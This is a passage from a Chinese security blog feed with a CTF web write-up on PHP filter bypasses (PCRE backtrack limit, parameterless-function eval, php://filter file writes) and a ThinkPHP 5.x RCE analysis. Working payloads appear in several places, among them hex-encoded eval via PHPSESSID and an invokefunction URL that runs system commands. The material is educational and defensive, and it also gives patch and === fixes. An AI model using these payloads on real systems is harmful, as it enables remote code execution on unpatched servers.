class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这个正则，就是为让PHP代码不能够实现闭合，也就是最后不能出现(`;?&gt;这几个符号，那怎么绕过？p神给出了这样的解释，由于正则有两种匹配模式</p><blockquote><ul><li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul></blockquote><p>而php的PCRE库使用的就是NFA的正则引擎，P神的debug过程很详细就不多说什么了。</p><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），不可能让你一直回溯浪费资源，给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限(如下图)：</p><p><img src="https://s2.ax1x.com/2019/02/27/kTgHij.png" alt="kTgHij.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTgjyV.png" alt="kTgjyV.png"></p><p>所以回溯的上限是1000000，如果超过1000000就会返回false了</p><p><img src="https://s2.ax1x.com/2019/02/27/kT2QfA.png" alt="kT2QfA.png"></p><p>这样答案就很明显了，我们可以用这个特性去绕过，发包即可</p><p><img src="https://s2.ax1x.com/2019/02/27/kTfWtg.png" alt="kTfWtg.png"></p><p><img src="https://s2.ax1x.com/2019/02/27/kTfXh4.png" alt="kTfXh4.png"></p><p>怎么防御？</p><p>可以使用<code>===</code>去防御，因为<code>preg_match</code>这个函数只会返回三个值1或者0或者false，可以看看这句话</p><blockquote><p>returns 1 if the <code>pattern</code><br>matches given <code>subject</code>, 0 if it does not, or <strong>FALSE</strong><br>if an error occurred.</p></blockquote><p><img src="https://s2.ax1x.com/2019/02/27/kThKDP.png" alt="kThKDP.png"></p><p>所以当出现false这种情况的时候，只要<code>===</code>存在就不会存在弱类型的情况，也就是下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h3><p>大佬们的骚操作又学习了，题目是下面这个样子的，然后观察一下这个正则，就是只能执行一个函数，但不能设置参数。</p><p>在这篇文章里面有提及<a href="https://lorexxar.cn/2018/05/23/rctf2018/，这篇文章用的是`next(getallheaders())`，通过获取头部信息去实现命令执行，但是这个题目有使用的是Nginx服务器，而且`getallheaders()`这个函数`getallheaders`函数是apache模块的函数，所以得另寻办法。" target="_blank" rel="noopener">https://lorexxar.cn/2018/05/23/rctf2018/，这篇文章用的是`next(getallheaders())`，通过获取头部信息去实现命令执行，但是这个题目有使用的是Nginx服务器，而且`getallheaders()`这个函数`getallheaders`函数是apache模块的函数，所以得另寻办法。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到大佬们的wp也是惊呆了，都记录一下，</p><h4 id="方法一-利用session-id"><a href="#方法一-利用session-id" class="headerlink" title="方法一:利用session_id"></a>方法一:利用session_id</h4><p>这个函数大的作用下图所示：</p><p><img src="https://s2.ax1x.com/2019/02/26/kodsJS.png" alt="kodsJS.png"></p><p>也就是获取PHPSESSID的内容，这样就可以控制PHPSESSID的内容，从而进行相关的命令执行，但需要注意的是PHPSESSID的内容可能有字符的限制，但是影响不大，所以最好还是转成16进制去操作</p><p><img src="https://s2.ax1x.com/2019/02/26/kowPQH.png" alt="kowPQH.png"></p><p>所以最后的操作是这样的</p><p>GET参数里面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure><p>PHPSESSID里面的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=7072696E745F72287363616E64697228272E2E2F2729293B</span><br><span class="line">#print_r(scandir(&apos;../&apos;));</span><br><span class="line">PHPSESSID=7072696E745F722866696C655F6765745F636F6E74656E747328272E2E2F666C61675F7068706279703473732729293B</span><br><span class="line">#print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/kowRpD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/26/kowRpD.md.png" alt="kowRpD.md.png"></a></p><h4 id="方法二-利用get-defined-vars"><a href="#方法二-利用get-defined-vars" class="headerlink" title="方法二:利用get_defined_vars"></a>方法二:利用get_defined_vars</h4><p><img src="https://s2.ax1x.com/2019/02/26/ko0HbR.png" alt="ko0HbR.png"></p><p>这个函数好像在某次的安恒月赛里面出现过，当时也是学习了，但是今天再次碰到，只能怪自己没有灵活运用，导致印象不深，现在再次使用了23333</p><p>既然是返回已定义的数组那么GET数组也肯定包含在里面，那么我们可以直接get传参就可以，然后可以根据<code>current</code>以及<code>next</code>函数去转移到你所需要的参数上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval(next(current(get_defined_vars())));&amp;1=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/27/kTVN3F.png" alt="kTVN3F.png"></p><p>另外在php 7.1下，<code>getenv()</code>函数新增了无参数时会获取服务段的env数据，这个时候也可以利用</p><p>还有其他大佬的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure><p>直接列目录，这里有个函数利用的很巧妙，就是<code>array_reverse</code>，这个函数恰好把数组里面的内容倒转过来，刚好可以使用一次next函数，不然的话调用数组里面的第三个值的话，就要使用多次next就显得冗余了。</p><h3 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h3><p>这个题目是关于写文件的，先把源码拿出来瞅瞅</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line"> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下，可以看到这里面写文件进去的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br></pre></td></tr></table></figure><p>是由两个部分组成的，第一个部分是<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，另外一个是可以由用户控制的<code>$log_name</code>，这里涉及的知识点是在第一个参数也是可控的，如果服务器設置了下面的相關參數的话就是可控的，這個可控的參數这个值是可以伪造的。怎么伪造呢？取的是HTTP headers中的<code>Host</code>的值。</p><p><img src="https://s2.ax1x.com/2019/03/04/kO4ySf.png" alt="kO4ySf.png"></p><p>下面的代码就是对写入文件的后缀名过滤，但是这个过滤太容易，因为后面是有关写文件的相关操作，他在底层会做一些操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>))</span><br></pre></td></tr></table></figure><p>这一点在我upload-lab这篇文章里面有提及过，这里只需要用类似<code>index.php/.</code>这样的文件名做绕过</p><p>在观察一下代码中可以写入的内容，可以发现写进去的内容都会经过<code>htmlspecialchars</code>这个函数，那就是说一旦遇到类似<code>&lt;</code>或者<code>&gt;</code>这的操作符，就会转义。</p><p><img src="https://s2.ax1x.com/2019/03/04/kXSFud.png" alt="kXSFud.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kOzz4K.png" alt="kOzz4K.png"></p><p>这里又涉及到另外的一个知识点了，可以参考一下这一篇文章:<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html，这种类型的题目第一次我好像实在moctf上的一个题目见到的233333" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html，这种类型的题目第一次我好像实在moctf上的一个题目见到的233333</a></p><p>由于是写入文件，可以利用php伪协议去实现多种骚操作，这里就涉及到base64这个问题，因为base64编码在遇到不在其编码集的字符的话会直接跳过，并且解码的时候是4位4位一组，所以这也是为什么下面的payload要凑出四个四个一组。</p><p>还有一个要注意的问题，由于<code>dig</code>接受的参数不允许过长，否则直接返回空，所以payload需要尽可能的短一些，构造payload：</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnCn0.png" alt="kXnCn0.png"></p><p>注意这里使用四个<code>*</code>就是为了不让发送的内容出现<code>=</code>，因为如果出现的话就会导致post参数增加一个，同时也起到了注释的作用，这里视情况将<code>*</code>增加。</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnQHK.png" alt="kXnQHK.png"></p><p>发包测试结果成功</p><p><img src="https://s2.ax1x.com/2019/03/04/kXnJ9H.png" alt="kXnJ9H.png"></p><p><img src="https://s2.ax1x.com/2019/03/04/kXn78J.png" alt="kXn78J.png"></p><p>还有一道PHP题目放在另外一篇文章说说吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这波刷题主要以学习为主，复现为主，知识点真的太棒了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.x RCE分析</title>
    <link href="0verwatch.top/thinkphp-5-rce.html"/>
    <id>0verwatch.top/thinkphp-5-rce.html</id>
    <published>2019-02-15T06:58:27.000Z</published>
    <updated>2019-02-15T06:59:56.368Z</updated>
    
    <content type="html"><![CDATA[<p>第一次进行代码量这么大的分析，记录一下，个人感觉新手真的不适应这种，应该找点小一点的cms去分析，如果不懂MVC架构<a id="more"></a>真的可能会懵。。。</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在分析这个之前还看了两篇tp5的RCE漏洞，这两个洞都是很相似的，都是利用一个可控的变量dispatch去实现到最后还是构造出回调函数，可以学习一下，感觉这里面的思路就是本文分析漏洞的来源</p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p>我这里已tp 5.0.22为例子，环境是phpstudy搭建的</p><h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><p>影响版本<br>THINKPHP 5.0.5-5.0.22</p><p>THINKPHP 5.1.0-5.1.30</p><p>5.0.x补丁地址：<a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p><img src="https://s2.ax1x.com/2019/02/15/kDf8x0.png" alt="kDf8x0.png"></p><p>5.1.x补丁地址：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>补丁中加了正则限制了控制器的自定义初始化</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/tp52/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure><p>根据补丁下的点，动态跟踪一下是否是因为controller没有做好过滤而实体化，确实是如此</p><p><img src="https://s2.ax1x.com/2019/02/15/kD51Gd.png" alt="kD51Gd.png"></p><p>根据传进去的payload，控制器以及下面的方法都会发生对应的变化，下面就可以分析一下攻击链的流程</p><p>可以从入口文件一级一级跟踪，进入到<code>App.php</code>中，这里应该涉及到一个开发的知识，在<code>App.php</code>中，会根据请求的URL调用<code>routeCheck</code>进行调度解析在<code>App.php</code>中，会根据请求的URL调用<code>routeCheck</code>进行调度解析获得到<code>$dispatch</code>，所以payload是一定要经过那里的，可以在那里加断点进行调试</p><p>定位到<code>/thinkphp/library/think/App.php:116</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$dispatch = <span class="keyword">self</span>::$dispatch;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">                $dispatch = <span class="keyword">self</span>::routeCheck($request, $config);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 记录当前调度信息</span></span><br><span class="line">            $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">    $data = <span class="keyword">self</span>::exec($dispatch, $config);<span class="comment">//这个函数很关键</span></span><br></pre></td></tr></table></figure><p>继续跟进<code>routeCheck</code>这个函数，同样在App.php里面</p><p><img src="https://s2.ax1x.com/2019/02/15/kDo5K1.png" alt="kDo5K1.png"></p><p>继续跟进到<code>path</code>方法里面，然后这里有一个pathinfo()函数，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        $suffix   = Config::get(<span class="string">'url_html_suffix'</span>);</span><br><span class="line">        $pathinfo = <span class="keyword">$this</span>-&gt;pathinfo();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $suffix) &#123;</span><br><span class="line">            <span class="comment">// 禁止伪静态访问</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = $pathinfo;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($suffix) &#123;</span><br><span class="line">            <span class="comment">// 去除正常的URL后缀</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.('</span> . ltrim($suffix, <span class="string">'.'</span>) . <span class="string">')$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 允许任何后缀访问</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.'</span> . <span class="keyword">$this</span>-&gt;ext() . <span class="string">'$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Config::get(&#39;var_pathinfo&#39;)</code>是配置文件中的设置的参数，默认值为<code>s</code>，怎么找到这个变量？可以全局搜索一下，可以搜索到其中一个配置文件里面有</p><p><img src="https://s2.ax1x.com/2019/02/15/kDThFS.png" alt="kDThFS.png"></p><p>从GET中获取键值，然后赋值给<code>routeCheck</code>中的<code>$path</code>，这里也就是<code>index/think\app/invokefunction</code>。</p><p><img src="https://s2.ax1x.com/2019/02/15/kDTvYF.png" alt="kDTvYF.png"></p><p>然后开始进入路由检测的部分，经过check的检查后会进入else的分支，但这一部分对于我们需要控制的变量没有任何影响，关键是<code>$result</code>以及<code>$must</code>这两个变量的赋值结果，这也是导致了后面操作的关键，可以进入<code>Route::parseUrl</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">($request, array $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">'pathinfo_depr'</span>];</span><br><span class="line">        $result = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由检测</span></span><br><span class="line">        $check = !is_null(<span class="keyword">self</span>::$routeCheck) ? <span class="keyword">self</span>::$routeCheck : $config[<span class="string">'url_route_on'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">            <span class="comment">// 开启路由</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(RUNTIME_PATH . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 读取路由缓存</span></span><br><span class="line">                $rules = <span class="keyword">include</span> RUNTIME_PATH . <span class="string">'route.php'</span>;</span><br><span class="line">                is_array($rules) &amp;&amp; Route::rules($rules);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $files = $config[<span class="string">'route_config_file'</span>];</span><br><span class="line">                <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_file(CONF_PATH . $file . CONF_EXT)) &#123;</span><br><span class="line">                        <span class="comment">// 导入路由配置</span></span><br><span class="line">                        $rules = <span class="keyword">include</span> CONF_PATH . $file . CONF_EXT;</span><br><span class="line">                        is_array($rules) &amp;&amp; Route::import($rules);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">            $result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</span><br><span class="line">            $must   = !is_null(<span class="keyword">self</span>::$routeMust) ? <span class="keyword">self</span>::$routeMust : $config[<span class="string">'url_route_must'</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($must &amp;&amp; <span class="keyword">false</span> === $result) &#123;</span><br><span class="line">                <span class="comment">// 路由无效</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RouteNotFoundException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">            $result = Route::parseUrl($path, $depr, $config[<span class="string">'controller_auto_search'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>Route::parseUrl</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">            $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">            <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">            $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">        &#125;</span><br><span class="line">        $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">        ....</span><br><span class="line">         <span class="keyword">return</span> [<span class="string">'type'</span> =&gt; <span class="string">'module'</span>, <span class="string">'module'</span> =&gt; $route];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再跟进一下<code>parseUrlPath()</code>，这里面就是返回一个$path变量，对包含<code>模块/控制器/操作</code>的URL进行分割成数组进行返回</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHQgJ.png" alt="kDHQgJ.png"></p><p>回到上一层的函数中，继续跟进，可以发现在自动搜索控制器的判断中进入了else语句，从而为控制器进行了赋值，这里是个赋值点，很关键</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHtUK.png" alt="kDHtUK.png"></p><p>然后以$route变量返回上层run函数</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHrDI.png" alt="kDHrDI.png"></p><p>此时$dispatch 进入到self::exec()中，继续跟进。此时的$dispatch 里面是一个以module为名字的数组，所以进入exec函数中必将进入分支为module的模块，然后进入<code>self::module</code>函数</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbesA.png" alt="kDbesA.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($dispatch, $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($dispatch[<span class="string">'type'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'redirect'</span>: <span class="comment">// 重定向跳转</span></span><br><span class="line">                $data = Response::create($dispatch[<span class="string">'url'</span>], <span class="string">'redirect'</span>)</span><br><span class="line">                    -&gt;code($dispatch[<span class="string">'status'</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'module'</span>: <span class="comment">// 模块/控制器/操作</span></span><br><span class="line">                $data = <span class="keyword">self</span>::module(</span><br><span class="line">                    $dispatch[<span class="string">'module'</span>],</span><br><span class="line">                    $config,</span><br><span class="line">                    <span class="keyword">isset</span>($dispatch[<span class="string">'convert'</span>]) ? 